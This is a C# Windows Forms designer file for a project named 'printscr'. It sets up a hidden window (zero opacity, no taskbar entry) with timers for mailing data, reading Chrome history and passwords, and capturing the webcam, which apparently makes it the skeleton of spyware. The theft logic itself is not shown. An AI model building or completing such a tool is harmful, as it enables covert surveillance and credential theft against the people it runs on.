namespace printscr
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.timer2 = new System.Windows.Forms.Timer(this.components);
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.timerMailSend = new System.Windows.Forms.Timer(this.components);
            this.timerChromeHistory = new System.Windows.Forms.Timer(this.components);
            this.timerChromePassword = new System.Windows.Forms.Timer(this.components);
            this.webCamCapture1 = new printscr.WebCamCapture();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.SuspendLayout();
            // 
            // timer1
            // 
            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // timer2
            // 
            this.timer2.Tick += new System.EventHandler(this.timer2_Tick);
            // 
            // pictureBox1
            // 
            this.pictureBox1.Location = new System.Drawing.Point(12, 3);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(428, 300);
            this.pictureBox1.TabIndex = 0;
            this.pictureBox1.TabStop = false;
            // 
            // timerMailSend
            // 
            this.timerMailSend.Tick += new System.EventHandler(this.timerMailSend_Tick);
            // 
            // timerChromeHistory
            // 
            this.timerChromeHistory.Interval = 999999999;
            this.timerChromeHistory.Tick += new System.EventHandler(this.timerChromeHistory_Tick);
            // 
            // timerChromePassword
            // 
            this.timerChromePassword.Tick += new System.EventHandler(this.timerChromePassword_Tick);
            // 
            // webCamCapture1
            // 
            this.webCamCapture1.CaptureHeight = 240;
            this.webCamCapture1.CaptureWidth = 320;
            this.webCamCapture1.FrameNumber = ((ulong)(0ul));
            this.webCamCapture1.Location = new System.Drawing.Point(0, 0);
            this.webCamCapture1.Name = "WebCamCapture";
            this.webCamCapture1.Size = new System.Drawing.Size(142, 103);
            this.webCamCapture1.TabIndex = 0;
            this.webCamCapture1.TimeToCapture_milliseconds = 100;
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(442, 302);
            this.Controls.Add(this.pictureBox1);
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "Form1";
            this.Opacity = 0D;
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Load += new System.EventHandler(this.Form1_Load);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.Timer timer1;
        private System.Windows.Forms.Timer timer2;
        private System.Windows.Forms.PictureBox pictureBox1;
        private System.Windows.Forms.Timer timerMailSend;
        private System.Windows.Forms.Timer timerChromeHistory;
        private System.Windows.Forms.Timer timerChromePassword;
        private WebCamCapture webCamCapture1;
    }
}

